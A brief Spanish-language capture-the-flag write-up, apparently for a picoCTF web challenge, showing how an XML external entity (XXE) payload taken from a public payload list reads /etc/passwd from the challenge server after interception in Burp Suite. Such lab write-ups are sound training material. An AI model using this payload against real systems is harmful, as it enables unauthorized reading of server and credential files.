### Descripcion
The web project was rushed and no security assessment was done. Can you read the /etc/passwd file?[Web Portal](http://saturn.picoctf.net:58247/)
### Solucion
La hint, nos decia que vieramos sobre las injecciones XXE
Entonces interceptamos con Burpsuite
![[Pasted image 20250403123755.png]]
Y vemos que hay un xml, y buscamos un payload en payload all the things que es el siguiente payload
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [<!ENTITY test SYSTEM 'file:///etc/passwd'>]>
<data><ID>
&test;
</ID></data>
```
![[Pasted image 20250403124543.png]]
### Tags
#xxe 
